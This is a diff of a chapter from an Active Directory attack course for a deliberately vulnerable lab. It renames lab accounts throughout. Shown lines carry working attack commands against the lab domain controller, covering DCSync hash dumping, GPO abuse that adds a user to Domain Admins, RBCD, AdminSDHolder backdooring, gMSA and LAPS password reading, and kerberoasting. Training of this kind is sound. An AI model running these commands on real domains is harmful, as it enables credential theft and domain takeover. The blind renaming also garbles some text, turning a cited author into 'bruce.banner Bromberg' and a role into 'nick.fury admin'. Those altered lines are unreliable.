@@ -113,14 +113,14 @@ The AD database (NTDS.dit) is partitioned. Each partition is a **naming context 
 3. **Domain NC** — `DC=corp,DC=local`. Users, groups, computers, OUs. **Per domain.**
 4. **Application NCs (optional)** — DNS (`DC=DomainDnsZones,DC=corp,DC=local` and `DC=ForestDnsZones,DC=corp,DC=local`), DFS, etc. May be domain-wide or forest-wide depending on app.
 
-The **Global Catalog** is a *partial read-only copy* of every domain NC in the forest, hosted on flagged DCs. Contains a subset of attributes flagged for GC replication (the schema bit `isMemberOfPartialAttributeSet`). Used for forest-wide searches like "find every user named Alice across all domains." Port: **3268** (LDAP) / **3269** (LDAPS) instead of 389/636.
+The **Global Catalog** is a *partial read-only copy* of every domain NC in the forest, hosted on flagged DCs. Contains a subset of attributes flagged for GC replication (the schema bit `isMemberOfPartialAttributeSet`). Used for forest-wide searches like "find every user named peter.parker across all domains." Port: **3268** (LDAP) / **3269** (LDAPS) instead of 389/636.
 
 ### LDAP distinguished names (DNs)
 
 An object is identified by its DN, read right-to-left from the root of the directory:
 
 ```
-CN=alice,CN=Users,DC=corp,DC=local
+CN=peter.parker,CN=Users,DC=corp,DC=local
 ^      ^         ^      ^
 |      |         |      +- top-level domain component
 |      |         +- second-level domain component
@@ -138,7 +138,7 @@ DC=corp,DC=local
        CN=Administrator
        CN=krbtgt
        CN=Domain Admins
-       CN=alice
+       CN=peter.parker
    CN=Computers             ← default computer container (NOT an OU)
        CN=WS01
    CN=System                ← system containers
@@ -149,8 +149,8 @@ DC=corp,DC=local
    OU=Domain Controllers    ← DCs go here; Default Domain Controllers Policy linked
        CN=DC01
    OU=ServiceAccounts        ← typical custom OU
-       CN=svc_sql
-       CN=svc_web
+       CN=svc_jarvis
+       CN=svc_vision
 ```
 
 ### Replication scope reminder
@@ -325,13 +325,13 @@ Any account with both of these extended rights on the domain root object:
 
 …can call `DRSGetNCChanges` against a DC and request specific objects, including the `unicodePwd`, `dBCSPwd`, and `supplementalCredentials` attributes (NT hash, LM hash, Kerberos keys). The DC happily sends them because it thinks the caller is another DC catching up.
 
-DVAD pre-grants these rights to a low-priv user `sync_user` for `CRED-007`. The technique is:
+DVAD pre-grants these rights to a low-priv user `doctor.strange` for `CRED-007`. The technique is:
 
 ```bash
-impacket-secretsdump -just-dc-user krbtgt corp.local/sync_user:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc-user krbtgt corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
 
 # Or all hashes
-impacket-secretsdump -just-dc corp.local/sync_user:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
 
 # As DA (default for Domain Admins members)
 impacket-secretsdump -just-dc corp.local/Administrator:'DVADlab2024!'@10.10.0.10
@@ -353,8 +353,8 @@ OUs are containers for delegation and GPO targeting. They form a tree under the 
 DC=corp,DC=local
   |
   +-- OU=ServiceAccounts
-  |     +-- CN=svc_sql
-  |     +-- CN=svc_web
+  |     +-- CN=svc_jarvis
+  |     +-- CN=svc_vision
   +-- OU=Workstations
   |     +-- CN=ws01
   +-- OU=Servers
@@ -364,13 +364,13 @@ DC=corp,DC=local
   |     +-- CN=dc01
   +-- CN=Users   ← default container, NOT an OU
   |     +-- CN=Administrator
-  |     +-- CN=alice
+  |     +-- CN=peter.parker
   +-- CN=Computers   ← default container, NOT an OU
 ```
 
 OUs allow:
 - **Linked GPOs** — policies applied to users/computers under that OU.
-- **Delegation** — grant another principal rights over the OU (e.g., "helpdesk can reset passwords for `OU=Users`").
+- **Delegation** — grant another principal rights over the OU (e.g., "nick.fury can reset passwords for `OU=Users`").
 
 ### Block inheritance and enforce
 
@@ -391,7 +391,7 @@ If any of those groups also contain a low-priv member you compromised, the OU's 
 PS> Get-ADOrganizationalUnit -Filter * -Properties nTSecurityDescriptor
 PS> dsacls "OU=ServiceAccounts,DC=corp,DC=local"
 PS> Get-DomainObjectAcl -SearchBase 'OU=ServiceAccounts,DC=corp,DC=local' -ResolveGUIDs |
-       Where-Object IdentityReferenceName -eq 'alice'
+       Where-Object IdentityReferenceName -eq 'peter.parker'
 ```
 
 ---
@@ -451,10 +451,10 @@ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 # Returns: SuperSecretPass123!
 
 # Edit a GPO (offensive)
-SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' alice /add /domain"
+SharpGPOAbuse.exe --AddComputerScript --GPOName "Default Domain Policy" --ScriptName evil.bat --ScriptContents "net group 'Domain Admins' peter.parker /add /domain"
 
 # Or via PowerShell / pyGPOAbuse on Kali
-pyGPOAbuse.py corp.local/alice:'DVADlab2024!' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -powershell -command "<base64 PS>"
+pyGPOAbuse.py corp.local/peter.parker:'DVADlab2024!' -gpo-id "{31B2F340-016D-11D2-945F-00C04FB984F9}" -powershell -command "<base64 PS>"
 ```
 
 ### Detection
@@ -587,13 +587,13 @@ SPNs are stored on the *account that runs the service*, in the `servicePrincipal
 ### Discovery
 
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 # or
-ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w '…' -b 'DC=corp,DC=local' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w '…' -b 'DC=corp,DC=local' \
   '(&(servicePrincipalName=*)(!objectClass=computer))' samAccountName servicePrincipalName
 ```
 
-DVAD has multiple kerberoastable accounts (`svc_sql`, `svc_web`, `svc_backup`) with weak passwords baked in for CRED-001.
+DVAD has multiple kerberoastable accounts (`svc_jarvis`, `svc_vision`, `svc_backup`) with weak passwords baked in for CRED-001.
 
 ### writeSPN abuse (Targeted Kerberoast / setspn against arbitrary user)
 
@@ -642,10 +642,10 @@ Inverted model: instead of telling service A "you can delegate to B," you tell *
 ```bash
 # Create attacker computer
 impacket-addcomputer -computer-name 'BADCOMP$' -computer-pass 'BadComp123!' \
-    -dc-host dc01.corp.local corp.local/alice:'DVADlab2024!'
+    -dc-host dc01.corp.local corp.local/peter.parker:'DVADlab2024!'
 
 # Write the RBCD
-impacket-rbcd corp.local/alice:'DVADlab2024!' -delegate-from 'BADCOMP$' \
+impacket-rbcd corp.local/peter.parker:'DVADlab2024!' -delegate-from 'BADCOMP$' \
     -delegate-to 'FILE01$' -action write -dc-host dc01.corp.local
 
 # S4U2Self impersonating Administrator
@@ -726,7 +726,7 @@ Stuff stored in `CN=Configuration,...` is read-by-everyone (Authenticated Users 
 | **DHCP Administrators** | (varies) | Manage DHCP — sometimes path to network MITM |
 | **Protected Users** | 525 | Members subject to extra Kerberos hardening: RC4 disabled, NTLM disabled, no caching, no delegation |
 
-DVAD intentionally populates Backup/Server/Print Operators with low-priv users so you can practice PE-* against the DC. The lab also adds `alice` (or a similar user) to `DnsAdmins` as a privesc gateway.
+DVAD intentionally populates Backup/Server/Print Operators with low-priv users so you can practice PE-* against the DC. The lab also adds `peter.parker` (or a similar user) to `DnsAdmins` as a privesc gateway.
 
 ### Protected Users — defenders' antidote
 
@@ -755,9 +755,9 @@ The list of protected groups is encoded in `CN=Directory Service,CN=Windows NT,C
 Edit AdminSDHolder's DACL to grant your account `GenericAll`. Within 60 minutes, every protected account in the domain (including DA accounts) has GenericAll granted to you. Now you can reset their passwords, set SPNs, modify them — domain admin via patience.
 
 ```bash
-# Add ACE to AdminSDHolder (requires GenericWrite on AdminSDHolder; you might get that as a junior helpdesk admin)
-dacledit -principal alice -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
-   -action write -rights FullControl corp.local/alice:'DVADlab2024!'
+# Add ACE to AdminSDHolder (requires GenericWrite on AdminSDHolder; you might get that as a junior nick.fury admin)
+dacledit -principal peter.parker -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
+   -action write -rights FullControl corp.local/peter.parker:'DVADlab2024!'
 
 # Wait 60 minutes, or trigger SDProp manually if you somehow have rights
 PS> Set-ItemProperty 'HKLM:\SYSTEM\CCS\Services\NTDS\Parameters' RunProtectAdminGroupsTask 1
@@ -827,7 +827,7 @@ struct {
 DVAD has a gMSA with overly permissive `msDS-GroupMSAMembership` so a regular user can read its blob via `gMSADumper.py`. That's `CRED-024`.
 
 ```bash
-python3 gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+python3 gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
 ```
 
 Output: NT hash of the gMSA's current password — pass-the-hash to wherever the gMSA can log in.
@@ -875,7 +875,7 @@ Implication: an attacker who "deletes" your high-value object can be undone — 
 `repadmin /showobjmeta` reveals per-attribute version history:
 
 ```
-PS> repadmin /showobjmeta dc01.corp.local "CN=alice,CN=Users,DC=corp,DC=local"
+PS> repadmin /showobjmeta dc01.corp.local "CN=peter.parker,CN=Users,DC=corp,DC=local"
 
 Loc.USN  Originating DSA       Org.USN  Org.Time/Date       Ver Attribute
 =======  =================     =======  ===================  === =========
@@ -884,7 +884,7 @@ Loc.USN  Originating DSA       Org.USN  Org.Time/Date       Ver Attribute
    ...
 ```
 
-A password change on `alice` increments her `unicodePwd` version. A forensic investigator can ask "when was Administrator's password last changed?" and learn whether an attacker reset it via DCSync. DCShadow attacks fake these metadata, which is part of why they evade naïve detection.
+A password change on `peter.parker` increments her `unicodePwd` version. A forensic investigator can ask "when was Administrator's password last changed?" and learn whether an attacker reset it via DCSync. DCShadow attacks fake these metadata, which is part of why they evade naïve detection.
 
 ---
 
@@ -944,7 +944,7 @@ Two generations:
 ACL pattern: only specific principals get **AllExtendedRights** (which includes the ms-Mcs-AdmPwd reading right). A misconfigured ACL → any low-priv user reads the local admin password of any computer.
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
 ```
 
 DVAD seeds a misconfigured LAPS ACL on one OU — that's CRED-019.
@@ -956,11 +956,11 @@ DVAD seeds a misconfigured LAPS ACL on one OU — that's CRED-019.
 To anchor the next chapters, this is what cross-forest looks like:
 
 ```
-[ alice in corp.local (Domain User) ]
+[ peter.parker in corp.local (Domain User) ]
           |
           | (1) Land via initial access (IA-* family)
           v
-[ alice in corp.local with creds ]
+[ peter.parker in corp.local with creds ]
           |
           | (2) Privesc to DA in corp.local (PE-*, CRED-007 DCSync)
           v
@@ -991,7 +991,7 @@ Each step is a distinct chapter — chapter 09 for IA, chapter 10 for CRED-007, 
 From your attacker box:
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
 ```
 
 You should see trust objects for `eu.corp.local` (parent-child), `finance.local` (external), and `root.corp` (forest).
@@ -1024,18 +1024,18 @@ Baseline: only built-in admins, SYSTEM, and "SELF" / "BUILTIN" should have anyth
 ### Exercise 4.D — UAC bit query for AS-REP roastable users
 
 ```bash
-ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
   -b 'DC=corp,DC=local' \
   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   samAccountName
 ```
 
-Expect a small set of intentionally roastable accounts (`svc_legacy`, perhaps `helpdesk`).
+Expect a small set of intentionally roastable accounts (`svc_legacy`, perhaps `nick.fury`).
 
 ### Exercise 4.E — Find SPNs
 
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 ```
 
 Gives you the list of kerberoastable users plus their SPNs. Don't crack yet — Chapter 10. Record output for the capstone.
@@ -1043,7 +1043,7 @@ Gives you the list of kerberoastable users plus their SPNs. Don't crack yet — 
 ### Exercise 4.F — Browse SYSVOL
 
 ```bash
-smbclient -U 'alice%DVADlab2024!' //10.10.0.10/SYSVOL
+smbclient -U 'peter.parker%DVADlab2024!' //10.10.0.10/SYSVOL
 smb: \> cd corp.local\Policies
 smb: \> ls
 smb: \> recurse on; prompt off; mget *
@@ -1132,7 +1132,7 @@ If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.
 - **harmj0y — *A Pentester's Guide to Group Scoping*** — corner case but worth knowing.
 - **Elad Shamir — *Wagging the Dog*** — the original RBCD writeup.
 - **SpecterOps — *Beyond the MCSE — Active Directory for the Security Professional*** — Sean Metcalf BlackHat talk.
-- **Charlie Bromberg — *Kerberos delegation in Active Directory: a complete guide*** — exhaustive delegation reference.
+- **bruce.banner Bromberg — *Kerberos delegation in Active Directory: a complete guide*** — exhaustive delegation reference.
 - **Black Hat / DEF CON talks** — *DCShadow*, *Golden SAML*, *From Domain Admin to Enterprise Admin*, *Lethal Injection: Forest Trusts*.
 
 Next: [05-authentication-protocols.md](05-authentication-protocols.md).
